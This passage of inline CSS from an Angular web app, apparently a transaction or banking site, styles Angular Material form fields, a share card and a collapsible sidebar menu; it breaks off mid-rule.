        .fade-background[_ngcontent-ois-c74] .card[_ngcontent-ois-c74] .card-body[_ngcontent-ois-c74] .description[_ngcontent-ois-c74] {
            text-align: left;
            font: 14px/16px Arial, sans-serif;
            letter-spacing: 0px;
            color: #666;
            margin-bottom: 0
        }

        .fade-background[_ngcontent-ois-c74] .card[_ngcontent-ois-c74] .card-body[_ngcontent-ois-c74] .TextSocial[_ngcontent-ois-c74] {
            text-align: center;
            font: 12px/14px Arial, sans-serif;
            letter-spacing: 0px;
            color: #666;
            opacity: 1
        }

        .fade-background[_ngcontent-ois-c74] .card[_ngcontent-ois-c74] .card-body[_ngcontent-ois-c74] .iconGrid[_ngcontent-ois-c74] {
            display: grid;
            margin-top: 24px
        }

        .iconShare[_ngcontent-ois-c74] {
            width: 56px;
            height: 56px;
            opacity: 1;
            filter: drop-shadow(0px 3px 6px #00000033)
        }

        .shared-webTransaction__card-body[_ngcontent-ois-c74] {
            width: 402px;
            height: 344px;
            padding: 24px
        }

        @media (max-width: 414px) {
            .shared-transaction__card-body[_ngcontent-ois-c74] {
                width: 370px !important
            }
        }

        @media (max-width: 375px) {
            .shared-transaction__card-body[_ngcontent-ois-c74] {
                width: 330px !important
            }

            .shared-webTransaction__card-body[_ngcontent-ois-c74] {
                width: 328px;
                height: 461px
            }
        }

        @media (max-width: 320px) {
            .shared-transaction__card-body[_ngcontent-ois-c74] {
                width: 270px !important;
                padding: 0 30px;
                max-height: 525px !important
            }

            .shared-transaction__card-body[_ngcontent-ois-c74] .button-wrapper[_ngcontent-ois-c74] {
                padding-bottom: 21px;
                padding-top: 21px
            }

            .shared-transaction__card-body[_ngcontent-ois-c74] .description {
                font-size: 12px !important;
                padding-bottom: 5px
            }

            .shared-webTransaction__card-body[_ngcontent-ois-c74] {
                width: 288px;
                height: 476px
            }
        }
    </style>
    <style>
        .mat-form-field {
            display: inline-block;
            position: relative;
            text-align: left
        }

        [dir=rtl] .mat-form-field {
            text-align: right
        }

        .mat-form-field-wrapper {
            position: relative
        }

        .mat-form-field-flex {
            display: inline-flex;
            align-items: baseline;
            box-sizing: border-box;
            width: 100%
        }

        .mat-form-field-prefix,
        .mat-form-field-suffix {
            white-space: nowrap;
            flex: none;
            position: relative
        }

        .mat-form-field-infix {
            display: block;
            position: relative;
            flex: auto;
            min-width: 0;
            width: 180px
        }

        .cdk-high-contrast-active .mat-form-field-infix {
            border-image: linear-gradient(transparent, transparent)
        }

        .mat-form-field-label-wrapper {
            position: absolute;
            left: 0;
            box-sizing: content-box;
            width: 100%;
            height: 100%;
            overflow: hidden;
            pointer-events: none
        }

        [dir=rtl] .mat-form-field-label-wrapper {
            left: auto;
            right: 0
        }

        .mat-form-field-label {
            position: absolute;
            left: 0;
            font: inherit;
            pointer-events: none;
            width: 100%;
            white-space: nowrap;
            text-overflow: ellipsis;
            overflow: hidden;
            transform-origin: 0 0;
            transition: transform 400ms cubic-bezier(0.25, 0.8, 0.25, 1), color 400ms cubic-bezier(0.25, 0.8, 0.25, 1), width 400ms cubic-bezier(0.25, 0.8, 0.25, 1);
            display: none
        }

        [dir=rtl] .mat-form-field-label {
            transform-origin: 100% 0;
            left: auto;
            right: 0
        }

        .cdk-high-contrast-active .mat-form-field-disabled .mat-form-field-label {
            color: GrayText
        }

        .mat-form-field-empty.mat-form-field-label,
        .mat-form-field-can-float.mat-form-field-should-float .mat-form-field-label {
            display: block
        }

        .mat-form-field-autofill-control:-webkit-autofill+.mat-form-field-label-wrapper .mat-form-field-label {
            display: none
        }

        .mat-form-field-can-float .mat-form-field-autofill-control:-webkit-autofill+.mat-form-field-label-wrapper .mat-form-field-label {
            display: block;
            transition: none
        }

        .mat-input-server:focus+.mat-form-field-label-wrapper .mat-form-field-label,
        .mat-input-server[placeholder]:not(:placeholder-shown)+.mat-form-field-label-wrapper .mat-form-field-label {
            display: none
        }

        .mat-form-field-can-float .mat-input-server:focus+.mat-form-field-label-wrapper .mat-form-field-label,
        .mat-form-field-can-float .mat-input-server[placeholder]:not(:placeholder-shown)+.mat-form-field-label-wrapper .mat-form-field-label {
            display: block
        }

        .mat-form-field-label:not(.mat-form-field-empty) {
            transition: none
        }

        .mat-form-field-underline {
            position: absolute;
            width: 100%;
            pointer-events: none;
            transform: scale3d(1, 1.0001, 1)
        }

        .mat-form-field-ripple {
            position: absolute;
            left: 0;
            width: 100%;
            transform-origin: 50%;
            transform: scaleX(0.5);
            opacity: 0;
            transition: background-color 300ms cubic-bezier(0.55, 0, 0.55, 0.2)
        }

        .mat-form-field.mat-focused .mat-form-field-ripple,
        .mat-form-field.mat-form-field-invalid .mat-form-field-ripple {
            opacity: 1;
            transform: none;
            transition: transform 300ms cubic-bezier(0.25, 0.8, 0.25, 1), opacity 100ms cubic-bezier(0.25, 0.8, 0.25, 1), background-color 300ms cubic-bezier(0.25, 0.8, 0.25, 1)
        }

        .mat-form-field-subscript-wrapper {
            position: absolute;
            box-sizing: border-box;
            width: 100%;
            overflow: hidden
        }

        .mat-form-field-subscript-wrapper .mat-icon,
        .mat-form-field-label-wrapper .mat-icon {
            width: 1em;
            height: 1em;
            font-size: inherit;
            vertical-align: baseline
        }

        .mat-form-field-hint-wrapper {
            display: flex
        }

        .mat-form-field-hint-spacer {
            flex: 1 0 1em
        }

        .mat-error {
            display: block
        }

        .mat-form-field-control-wrapper {
            position: relative
        }

        .mat-form-field-hint-end {
            order: 1
        }

        .mat-form-field._mat-animation-noopable .mat-form-field-label,
        .mat-form-field._mat-animation-noopable .mat-form-field-ripple {
            transition: none
        }
    </style>
    <style>
        .mat-form-field-appearance-fill .mat-form-field-flex {
            border-radius: 4px 4px 0 0;
            padding: .75em .75em 0 .75em
        }

        .cdk-high-contrast-active .mat-form-field-appearance-fill .mat-form-field-flex {
            outline: solid 1px
        }

        .cdk-high-contrast-active .mat-form-field-appearance-fill.mat-form-field-disabled .mat-form-field-flex {
            outline-color: GrayText
        }

        .cdk-high-contrast-active .mat-form-field-appearance-fill.mat-focused .mat-form-field-flex {
            outline: dashed 3px
        }

        .mat-form-field-appearance-fill .mat-form-field-underline::before {
            content: "";
            display: block;
            position: absolute;
            bottom: 0;
            height: 1px;
            width: 100%
        }

        .mat-form-field-appearance-fill .mat-form-field-ripple {
            bottom: 0;
            height: 2px
        }

        .cdk-high-contrast-active .mat-form-field-appearance-fill .mat-form-field-ripple {
            height: 0
        }

        .mat-form-field-appearance-fill:not(.mat-form-field-disabled) .mat-form-field-flex:hover~.mat-form-field-underline .mat-form-field-ripple {
            opacity: 1;
            transform: none;
            transition: opacity 600ms cubic-bezier(0.25, 0.8, 0.25, 1)
        }

        .mat-form-field-appearance-fill._mat-animation-noopable:not(.mat-form-field-disabled) .mat-form-field-flex:hover~.mat-form-field-underline .mat-form-field-ripple {
            transition: none
        }

        .mat-form-field-appearance-fill .mat-form-field-subscript-wrapper {
            padding: 0 1em
        }
    </style>
    <style>
        .mat-input-element {
            font: inherit;
            background: transparent;
            color: currentColor;
            border: none;
            outline: none;
            padding: 0;
            margin: 0;
            width: 100%;
            max-width: 100%;
            vertical-align: bottom;
            text-align: inherit;
            box-sizing: content-box
        }

        .mat-input-element:-moz-ui-invalid {
            box-shadow: none
        }

        .mat-input-element,
        .mat-input-element::-webkit-search-cancel-button,
        .mat-input-element::-webkit-search-decoration,
        .mat-input-element::-webkit-search-results-button,
        .mat-input-element::-webkit-search-results-decoration {
            -webkit-appearance: none
        }

        .mat-input-element::-webkit-contacts-auto-fill-button,
        .mat-input-element::-webkit-caps-lock-indicator,
        .mat-input-element:not([type=password])::-webkit-credentials-auto-fill-button {
            visibility: hidden
        }

        .mat-input-element[type=date],
        .mat-input-element[type=datetime],
        .mat-input-element[type=datetime-local],
        .mat-input-element[type=month],
        .mat-input-element[type=week],
        .mat-input-element[type=time] {
            line-height: 1
        }

        .mat-input-element[type=date]::after,
        .mat-input-element[type=datetime]::after,
        .mat-input-element[type=datetime-local]::after,
        .mat-input-element[type=month]::after,
        .mat-input-element[type=week]::after,
        .mat-input-element[type=time]::after {
            content: " ";
            white-space: pre;
            width: 1px
        }

        .mat-input-element::-webkit-inner-spin-button,
        .mat-input-element::-webkit-calendar-picker-indicator,
        .mat-input-element::-webkit-clear-button {
            font-size: .75em
        }

        .mat-input-element::placeholder {
            -webkit-user-select: none;
            user-select: none;
            transition: color 400ms 133.3333333333ms cubic-bezier(0.25, 0.8, 0.25, 1)
        }

        .mat-input-element::-moz-placeholder {
            -webkit-user-select: none;
            user-select: none;
            transition: color 400ms 133.3333333333ms cubic-bezier(0.25, 0.8, 0.25, 1)
        }

        .mat-input-element::-webkit-input-placeholder {
            -webkit-user-select: none;
            user-select: none;
            transition: color 400ms 133.3333333333ms cubic-bezier(0.25, 0.8, 0.25, 1)
        }

        .mat-input-element:-ms-input-placeholder {
            -webkit-user-select: none;
            user-select: none;
            transition: color 400ms 133.3333333333ms cubic-bezier(0.25, 0.8, 0.25, 1)
        }

        .mat-form-field-hide-placeholder .mat-input-element::placeholder {
            color: transparent !important;
            -webkit-text-fill-color: transparent;
            transition: none
        }

        .cdk-high-contrast-active .mat-form-field-hide-placeholder .mat-input-element::placeholder {
            opacity: 0
        }

        .mat-form-field-hide-placeholder .mat-input-element::-moz-placeholder {
            color: transparent !important;
            -webkit-text-fill-color: transparent;
            transition: none
        }

        .cdk-high-contrast-active .mat-form-field-hide-placeholder .mat-input-element::-moz-placeholder {
            opacity: 0
        }

        .mat-form-field-hide-placeholder .mat-input-element::-webkit-input-placeholder {
            color: transparent !important;
            -webkit-text-fill-color: transparent;
            transition: none
        }

        .cdk-high-contrast-active .mat-form-field-hide-placeholder .mat-input-element::-webkit-input-placeholder {
            opacity: 0
        }

        .mat-form-field-hide-placeholder .mat-input-element:-ms-input-placeholder {
            color: transparent !important;
            -webkit-text-fill-color: transparent;
            transition: none
        }

        .cdk-high-contrast-active .mat-form-field-hide-placeholder .mat-input-element:-ms-input-placeholder {
            opacity: 0
        }

        textarea.mat-input-element {
            resize: vertical;
            overflow: auto
        }

        textarea.mat-input-element.cdk-textarea-autosize {
            resize: none
        }

        textarea.mat-input-element {
            padding: 2px 0;
            margin: -2px 0
        }

        select.mat-input-element {
            -moz-appearance: none;
            -webkit-appearance: none;
            position: relative;
            background-color: transparent;
            display: inline-flex;
            box-sizing: border-box;
            padding-top: 1em;
            top: -1em;
            margin-bottom: -1em
        }

        select.mat-input-element::-moz-focus-inner {
            border: 0
        }

        select.mat-input-element:not(:disabled) {
            cursor: pointer
        }

        .mat-form-field-type-mat-native-select .mat-form-field-infix::after {
            content: "";
            width: 0;
            height: 0;
            border-left: 5px solid transparent;
            border-right: 5px solid transparent;
            border-top: 5px solid;
            position: absolute;
            top: 50%;
            right: 0;
            margin-top: -2.5px;
            pointer-events: none
        }

        [dir=rtl] .mat-form-field-type-mat-native-select .mat-form-field-infix::after {
            right: auto;
            left: 0
        }

        .mat-form-field-type-mat-native-select .mat-input-element {
            padding-right: 15px
        }

        [dir=rtl] .mat-form-field-type-mat-native-select .mat-input-element {
            padding-right: 0;
            padding-left: 15px
        }

        .mat-form-field-type-mat-native-select .mat-form-field-label-wrapper {
            max-width: calc(100% - 10px)
        }

        .mat-form-field-type-mat-native-select.mat-form-field-appearance-outline .mat-form-field-infix::after {
            margin-top: -5px
        }

        .mat-form-field-type-mat-native-select.mat-form-field-appearance-fill .mat-form-field-infix::after {
            margin-top: -10px
        }
    </style>
    <style>
        .mat-form-field-appearance-legacy .mat-form-field-label {
            transform: perspective(100px)
        }

        .mat-form-field-appearance-legacy .mat-form-field-prefix .mat-icon,
        .mat-form-field-appearance-legacy .mat-form-field-suffix .mat-icon {
            width: 1em
        }

        .mat-form-field-appearance-legacy .mat-form-field-prefix .mat-icon-button,
        .mat-form-field-appearance-legacy .mat-form-field-suffix .mat-icon-button {
            font: inherit;
            vertical-align: baseline
        }

        .mat-form-field-appearance-legacy .mat-form-field-prefix .mat-icon-button .mat-icon,
        .mat-form-field-appearance-legacy .mat-form-field-suffix .mat-icon-button .mat-icon {
            font-size: inherit
        }

        .mat-form-field-appearance-legacy .mat-form-field-underline {
            height: 1px
        }

        .cdk-high-contrast-active .mat-form-field-appearance-legacy .mat-form-field-underline {
            height: 0;
            border-top: solid 1px
        }

        .mat-form-field-appearance-legacy .mat-form-field-ripple {
            top: 0;
            height: 2px;
            overflow: hidden
        }

        .cdk-high-contrast-active .mat-form-field-appearance-legacy .mat-form-field-ripple {
            height: 0;
            border-top: solid 2px
        }

        .mat-form-field-appearance-legacy.mat-form-field-disabled .mat-form-field-underline {
            background-position: 0;
            background-color: transparent
        }

        .cdk-high-contrast-active .mat-form-field-appearance-legacy.mat-form-field-disabled .mat-form-field-underline {
            border-top-style: dotted;
            border-top-width: 2px;
            border-top-color: GrayText
        }

        .mat-form-field-appearance-legacy.mat-form-field-invalid:not(.mat-focused) .mat-form-field-ripple {
            height: 1px
        }
    </style>
    <style>
        .mat-form-field-appearance-outline .mat-form-field-wrapper {
            margin: .25em 0
        }

        .mat-form-field-appearance-outline .mat-form-field-flex {
            padding: 0 .75em 0 .75em;
            margin-top: -0.25em;
            position: relative
        }

        .mat-form-field-appearance-outline .mat-form-field-prefix,
        .mat-form-field-appearance-outline .mat-form-field-suffix {
            top: .25em
        }

        .mat-form-field-appearance-outline .mat-form-field-outline {
            display: flex;
            position: absolute;
            top: .25em;
            left: 0;
            right: 0;
            bottom: 0;
            pointer-events: none
        }

        .mat-form-field-appearance-outline .mat-form-field-outline-start,
        .mat-form-field-appearance-outline .mat-form-field-outline-end {
            border: 1px solid currentColor;
            min-width: 5px
        }

        .mat-form-field-appearance-outline .mat-form-field-outline-start {
            border-radius: 5px 0 0 5px;
            border-right-style: none
        }

        [dir=rtl] .mat-form-field-appearance-outline .mat-form-field-outline-start {
            border-right-style: solid;
            border-left-style: none;
            border-radius: 0 5px 5px 0
        }

        .mat-form-field-appearance-outline .mat-form-field-outline-end {
            border-radius: 0 5px 5px 0;
            border-left-style: none;
            flex-grow: 1
        }

        [dir=rtl] .mat-form-field-appearance-outline .mat-form-field-outline-end {
            border-left-style: solid;
            border-right-style: none;
            border-radius: 5px 0 0 5px
        }

        .mat-form-field-appearance-outline .mat-form-field-outline-gap {
            border-radius: .000001px;
            border: 1px solid currentColor;
            border-left-style: none;
            border-right-style: none
        }

        .mat-form-field-appearance-outline.mat-form-field-can-float.mat-form-field-should-float .mat-form-field-outline-gap {
            border-top-color: transparent
        }

        .mat-form-field-appearance-outline .mat-form-field-outline-thick {
            opacity: 0
        }

        .mat-form-field-appearance-outline .mat-form-field-outline-thick .mat-form-field-outline-start,
        .mat-form-field-appearance-outline .mat-form-field-outline-thick .mat-form-field-outline-end,
        .mat-form-field-appearance-outline .mat-form-field-outline-thick .mat-form-field-outline-gap {
            border-width: 2px
        }

        .mat-form-field-appearance-outline.mat-focused .mat-form-field-outline,
        .mat-form-field-appearance-outline.mat-form-field-invalid .mat-form-field-outline {
            opacity: 0;
            transition: opacity 100ms cubic-bezier(0.25, 0.8, 0.25, 1)
        }

        .mat-form-field-appearance-outline.mat-focused .mat-form-field-outline-thick,
        .mat-form-field-appearance-outline.mat-form-field-invalid .mat-form-field-outline-thick {
            opacity: 1
        }

        .cdk-high-contrast-active .mat-form-field-appearance-outline.mat-focused .mat-form-field-outline-thick {
            border: 3px dashed
        }

        .mat-form-field-appearance-outline:not(.mat-form-field-disabled) .mat-form-field-flex:hover .mat-form-field-outline {
            opacity: 0;
            transition: opacity 600ms cubic-bezier(0.25, 0.8, 0.25, 1)
        }

        .mat-form-field-appearance-outline:not(.mat-form-field-disabled) .mat-form-field-flex:hover .mat-form-field-outline-thick {
            opacity: 1
        }

        .mat-form-field-appearance-outline .mat-form-field-subscript-wrapper {
            padding: 0 1em
        }

        .cdk-high-contrast-active .mat-form-field-appearance-outline.mat-form-field-disabled .mat-form-field-outline {
            color: GrayText
        }

        .mat-form-field-appearance-outline._mat-animation-noopable:not(.mat-form-field-disabled) .mat-form-field-flex:hover~.mat-form-field-outline,
        .mat-form-field-appearance-outline._mat-animation-noopable .mat-form-field-outline,
        .mat-form-field-appearance-outline._mat-animation-noopable .mat-form-field-outline-start,
        .mat-form-field-appearance-outline._mat-animation-noopable .mat-form-field-outline-end,
        .mat-form-field-appearance-outline._mat-animation-noopable .mat-form-field-outline-gap {
            transition: none
        }
    </style>
    <style>
        .mat-form-field-appearance-standard .mat-form-field-flex {
            padding-top: .75em
        }

        .mat-form-field-appearance-standard .mat-form-field-underline {
            height: 1px
        }

        .cdk-high-contrast-active .mat-form-field-appearance-standard .mat-form-field-underline {
            height: 0;
            border-top: solid 1px
        }

        .mat-form-field-appearance-standard .mat-form-field-ripple {
            bottom: 0;
            height: 2px
        }

        .cdk-high-contrast-active .mat-form-field-appearance-standard .mat-form-field-ripple {
            height: 0;
            border-top: solid 2px
        }

        .mat-form-field-appearance-standard.mat-form-field-disabled .mat-form-field-underline {
            background-position: 0;
            background-color: transparent
        }

        .cdk-high-contrast-active .mat-form-field-appearance-standard.mat-form-field-disabled .mat-form-field-underline {
            border-top-style: dotted;
            border-top-width: 2px
        }

        .mat-form-field-appearance-standard:not(.mat-form-field-disabled) .mat-form-field-flex:hover~.mat-form-field-underline .mat-form-field-ripple {
            opacity: 1;
            transform: none;
            transition: opacity 600ms cubic-bezier(0.25, 0.8, 0.25, 1)
        }

        .mat-form-field-appearance-standard._mat-animation-noopable:not(.mat-form-field-disabled) .mat-form-field-flex:hover~.mat-form-field-underline .mat-form-field-ripple {
            transition: none
        }
    </style>
    <style>
        .pointer[_ngcontent-ois-c79] {
            cursor: pointer
        }

        .sidebar[_ngcontent-ois-c79] {
            position: fixed;
            background-color: #fff;
            width: 64px;
            min-height: 352px;
            height: 100%;
            font-family: Arial, sans-serif;
            top: 0;
            left: 0;
            padding-top: 64px;
            box-shadow: 3px -1px 5px #00000059;
            overflow: hidden;
            transition: all .6s ease;
            z-index: 1001
        }

        .sidebar.notLogged[_ngcontent-ois-c79] {
            height: 100%
        }

        .sidebar.active[_ngcontent-ois-c79] .li.secondary-level-trigger[_ngcontent-ois-c79]:after {
            display: inline-block;
            pointer-events: none
        }

        .sidebar.active[_ngcontent-ois-c79] {
            width: 380px
        }

        .sidebar.active[_ngcontent-ois-c79] .li[_ngcontent-ois-c79] {
            min-width: 380px
        }

        .sidebar.active[_ngcontent-ois-c79] .li[_ngcontent-ois-c79] a[_ngcontent-ois-c79] {
            display: inline
        }

        .sidebar.active[_ngcontent-ois-c79] .secondary-menu-wrapper[_ngcontent-ois-c79] {
            min-width: 380px
        }

        .sidebar.active[_ngcontent-ois-c79] .secondary-menu-wrapper[_ngcontent-ois-c79] .img-wrapper.toggle[_ngcontent-ois-c79] {
            display: none
        }

        .sidebar.active[_ngcontent-ois-c79] .secondary-menu-wrapper[_ngcontent-ois-c79] .secondary-menu[_ngcontent-ois-c79],
        .sidebar.active[_ngcontent-ois-c79] .secondary-submenu-wrapper[_ngcontent-ois-c79],
        .sidebar.active[_ngcontent-ois-c79] .secondary-submenu-wrapper[_ngcontent-ois-c79] .secondary-submenu[_ngcontent-ois-c79] {
            min-width: 380px;
            display: flex
        }

        .sidebar[_ngcontent-ois-c79] .li[_ngcontent-ois-c79] {
            display: flex;
            justify-content: left;
            align-items: center;
            cursor: pointer;
            height: 48px;
            position: relative
        }

        .sidebar[_ngcontent-ois-c79] .li[_ngcontent-ois-c79]:hover {
            background-color: #f0f0f0
        }

        .sidebar[_ngcontent-ois-c79] .li[_ngcontent-ois-c79]:hover a[_ngcontent-ois-c79] {
            color: #009fda
        }

        .sidebar[_ngcontent-ois-c79] .li.active[_ngcontent-ois-c79] {
            border-left: solid 3px #ff5800;
            background-color: #fff
        }

        .sidebar[_ngcontent-ois-c79] .li.active[_ngcontent-ois-c79] a[_ngcontent-ois-c79] {
            color: #004e9b
        }

        .sidebar[_ngcontent-ois-c79] .li.active[_ngcontent-ois-c79] .img-wrapper[_ngcontent-ois-c79] {
            max-width: 61px
        }

        .sidebar[_ngcontent-ois-c79] .li.active[_ngcontent-ois-c79] .img-wrapper[_ngcontent-ois-c79] img[_ngcontent-ois-c79] {
            fill: #009fda
        }

        .sidebar[_ngcontent-ois-c79] .li.active[_ngcontent-ois-c79] .img-wrapper[_ngcontent-ois-c79] .invisible[_ngcontent-ois-c79] {
            visibility: hidden
        }

        .sidebar[_ngcontent-ois-c79] .li[_ngcontent-ois-c79]:hover a[_ngcontent-ois-c79],
        .sidebar[_ngcontent-ois-c79] .li.active[_ngcontent-ois-c79] a[_ngcontent-ois-c79] {
            font-weight: 700
        }

        .sidebar[_ngcontent-ois-c79] .li[_ngcontent-ois-c79] .img-wrapper[_ngcontent-ois-c79] {
            max-width: 64px;
            height: 48px;
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center
        }

        .sidebar[_ngcontent-ois-c79] .li[_ngcontent-ois-c79] a[_ngcontent-ois-c79] {
            display: none;
            margin: .5em;
            text-decoration: none;
            font-family: Arial, sans-serif;
            font-size: 16px;
            color: #004e9b
        }

        .sidebar[_ngcontent-ois-c79] .li.secondary-level-trigger[_ngcontent-ois-c79]:after {
            display: none;
            border-style: solid;
            border-width: 2px 2px 0 0;
            border-color: #ff5800;
            content: "";
            height: 12px;
            width: 12px;
            right: 16px;
            position: absolute;
            transform: rotate(45deg);
            vertical-align: top;
            transition: all .6s ease
        }

        .sidebar[_ngcontent-ois-c79] .imgHover[_ngcontent-ois-c79] {
            filter: invert(16%) sepia(100%) saturate(7298%) hue-rotate(187deg) brightness(103%) contrast(105%)
        }

        .sidebar[_ngcontent-ois-c79] .second-level[_ngcontent-ois-c79] {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            transform: translate(-105%);
            font-family: Arial, sans-serif;
            padding-top: 64px;
            background-color: #fff;
            box-shadow: 3px -1px 5px #00000059;
            transition: transform .3s ease;
            z-index: 1004
        }

        .sidebar[_ngcontent-ois-c79] .second-level.active[_ngcontent-ois-c79] {
            transform: translate(0)
        }

        .sidebar[_ngcontent-ois-c79] .second-level.active[_ngcontent-ois-c79] .li[_ngcontent-ois-c79] {
            min-width: 380px
        }

        .sidebar[_ngcontent-ois-c79] .second-level.active[_ngcontent-ois-c79] .li[_ngcontent-ois-c79] a[_ngcontent-ois-c79] {
            display: inline
        }

        .sidebar[_ngcontent-ois-c79] .second-level[_ngcontent-ois-c79] .li[_ngcontent-ois-c79] .transfer[_ngcontent-ois-c79] {
            position: relative;
            left: 10px
        }

        .sidebar[_ngcontent-ois-c79] .second-level[_ngcontent-ois-c79] .li.secondary-level-trigger[_ngcontent-ois-c79] {
            background-color: #d9e5f0;
            font-weight: 700
        }

        .sidebar[_ngcontent-ois-c79] .second-level[_ngcontent-ois-c79] .li.secondary-level-trigger[_ngcontent-ois-c79] a[_ngcontent-ois-c79] {
            color: #004e9b
        }

        .sidebar[_ngcontent-ois-c79] .second-level[_ngcontent-ois-c79] .li.secondary-level-trigger[_ngcontent-ois-c79]:hover {
            background-color: #d9e5f0;
            font-weight: 700
        }

        .sidebar[_ngcontent-ois-c79] .second-level[_ngcontent-ois-c79] .li.secondary-level-trigger[_ngcontent-ois-c79]:hover a[_ngcontent-ois-c79] {
            color: #004e9b
        }

        .sidebar[_ngcontent-ois-c79] .second-level[_ngcontent-ois-c79] .li.secondary-level-trigger[_ngcontent-ois-c79]:after {
            transform: rotate(225deg)
        }

        .sidebar[_ngcontent-ois-c79] .second-level.scroll-second-level[_ngcontent-ois-c79] {
            height: 100vh
        }

        .sidebar[_ngcontent-ois-c79] .secondary-menu-wrapper[_ngcontent-ois-c79] {
            position: absolute;
            bottom: 0;
            left: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            height: 48px;
            width: 64px;
            z-index: 1003
        }

        .sidebar[_ngcontent-ois-c79] .secondary-menu-wrapper[_ngcontent-ois-c79] .img-wrapper.toggle[_ngcontent-ois-c79] {
            height: 48px;
            width: 64px;
            align-self: flex-start;
            display: flex;
            justify-content: center;
            align-items: center
        }

        .sidebar[_ngcontent-ois-c79] .secondary-menu-wrapper[_ngcontent-ois-c79] .secondary-menu[_ngcontent-ois-c79] {
            position: sticky;
            bottom: 0;
            background-color: #fff;
            border: 1px solid #e4e4e4 !important;
            box-shadow: 2px 2px 10px #00000059;
            height: 48px;
            display: none
        }

        .sidebar[_ngcontent-ois-c79] .secondary-menu-wrapper[_ngcontent-ois-c79] .secondary-menu[_ngcontent-ois-c79] .img-wrapper[_ngcontent-ois-c79] {
            height: 48px;
            display: flex;
            justify-content: center;
            align-items: center
        }

        .sidebar[_ngcontent-ois-c79] .secondary-menu-wrapper[_ngcontent-ois-c79] .secondary-menu[_ngcontent-ois-c79] .img-wrapper[_ngcontent-ois-c79] img[_ngcontent-ois-c79] {
            height: 24px;
            width: 24px
        }

        .sidebar[_ngcontent-ois-c79] .secondary-menu-wrapper[_ngcontent-ois-c79] .secondary-menu[_ngcontent-ois-c79] .icon-wrapper[_ngcontent-ois-c79] {
            height: 48px;
            display: flex;
            justify-content: center;
            align-items: center
        }

        .sidebar[_ngcontent-ois-c79] .secondary-menu-wrapper[_ngcontent-ois-c79] .secondary-menu[_ngcontent-ois-c79] .icon-wrapper[_ngcontent-ois-c79] .chevron[_ngcontent-ois-c79] {
            height: 28px;
            width: 28px;
            background: transparent linear-gradient(180deg, #f9e300 0%, #ff5800 100%) 0 0 no-repeat padding-box;
            border-radius: 50%
        }

        .sidebar[_ngcontent-ois-c79] .secondary-menu-wrapper[_ngcontent-ois-c79] .secondary-menu[_ngcontent-ois-c79] .icon-wrapper[_ngcontent-ois-c79] .chevron[_ngcontent-ois-c79]:before {
            border-style: solid;
            border-width: 2px 2px 0 0;
            border-color: #fff;
            content: "";
            display: inline-block;
            height: 8px;
            width: 8px;
            top: 12px;
            left: 10px;
            position: relative;
            transform: rotate(-45deg);
            vertical-align: top;
            transition: all .3s ease
        }

        .sidebar[_ngcontent-ois-c79] .secondary-menu-wrapper[_ngcontent-ois-c79] .secondary-menu[_ngcontent-ois-c79] .icon-wrapper[_ngcontent-ois-c79] .chevron.bottom[_ngcontent-ois-c79]:before {
            top: 10px;
            transform: rotate(135deg)
        }

        .sidebar[_ngcontent-ois-c79] .secondary-submenu-wrapper[_ngcontent-ois-c79] {
            position: absolute;
            bottom: 0;
            left: 0;
            display: none;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            width: 64px;
            height: 96px;
            z-index: 1002
        }

        .sidebar[_ngcontent-ois-c79] .secondary-submenu-wrapper[_ngcontent-ois-c79] .secondary-submenu[_ngcontent-ois-c79] {
            display: none;
            width: 64px;
            height: 96px;
            overflow: hidden;
            margin-bottom: -96px;
            background-color: #f2f2f2;
            box-shadow: none;
            border: 1px solid #e4e4e4;
            border-radius: 25px 25px 0 0;
            transition: all .6s ease
        }

        .sidebar[_ngcontent-ois-c79] .secondary-submenu-wrapper[_ngcontent-ois-c79] .secondary-submenu.open[_ngcontent-ois-c79] {
            display: flex;
            margin-bottom: 0;
            box-shadow: 2px 2px 10px #00000059
        }

        .sidebar[_ngcontent-ois-c79] .secondary-submenu-wrapper[_ngcontent-ois-c79] .secondary-submenu[_ngcontent-ois-c79] .img-wrapper[_ngcontent-ois-c79] {
            height: 48px;
            display: flex;
            justify-content: center;
            align-items: center
        }

        .sidebar[_ngcontent-ois-c79] .secondary-submenu-wrapper[_ngcontent-ois-c79] .secondary-submenu[_ngcontent-ois-c79] .img-wrapper[_ngcontent-ois-c79] img[_ngcontent-ois-c79] {
            height: 30px
        }

        .newIcon[_ngcontent-ois-c79] {
            width: 16px !important;
            height: 16px !important;
            position: absolute;
            margin-right: -50px;
            margin-top: -30px
        }

        .newMessage[_ngcontent-ois-c79] {
            text-align: left;
            font: 12px/14px Arial, sans-serif;
            letter-spacing: 0px;
            color: #ff691a;
            position: absolute;
            margin-top: -10px
        }

        .fade-background-menu[_ngcontent-ois-c79] {
            position: fixed;
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100%;
            min-height: 100vh;
            background: #66666640 0% 0% no-repeat padding-box;
            z-index: 1001;
            transition: all .6s ease;
            top: 0;
            left: 0
        }

        .upWidth[_ngcontent-ois-c79] {
            width: 100%
        }

        @media (min-width: 1024px) {
            .sidebar[_ngcontent-ois-c79]:hover .secondary-menu-wrapper[_ngcontent-ois-c79] .img-wrapper.toggle[_ngcontent-ois-c79] {
                display: none
            }

            .sidebar[_ngcontent-ois-c79]:hover .secondary-submenu-wrapper[_ngcontent-ois-c79],
            .sidebar[_ngcontent-ois-c79]:hover .secondary-submenu-wrapper[_ngcontent-ois-c79] .secondary-submenu[_ngcontent-ois-c79] {
                min-width: 380px;
                display: flex
            }
        }

        @media (max-width: 1111px) {
            .sidebar[_ngcontent-ois-c79] {
                width: 0
            }
        }

        @media (max-width: 393px) {

            .sidebar[_ngcontent-ois-c79],
            .sidebar[_ngcontent-ois-c79]:hover {
                width: 0
            }

            .sidebar[_ngcontent-ois-c79]:hover .secondary-menu-wrapper[_ngcontent-ois-c79] {
                min-width: 0
            }

            .sidebar[_ngcontent-ois-c79]:hover .secondary-menu-wrapper[_ngcontent-ois-c79] .img-wrapper.toggle[_ngcontent-ois-c79] {
                display: none
            }

            .sidebar[_ngcontent-ois-c79]:hover .secondary-menu-wrapper[_ngcontent-ois-c79] .secondary-menu[_ngcontent-ois-c79],
            .sidebar[_ngcontent-ois-c79]:hover .secondary-submenu-wrapper[_ngcontent-ois-c79],
            .sidebar[_ngcontent-ois-c79]:hover .secondary-submenu-wrapper[_ngcontent-ois-c79] .secondary-submenu[_ngcontent-ois-c79] {
                min-width: 0
            }

            .sidebar.active[_ngcontent-ois-c79],
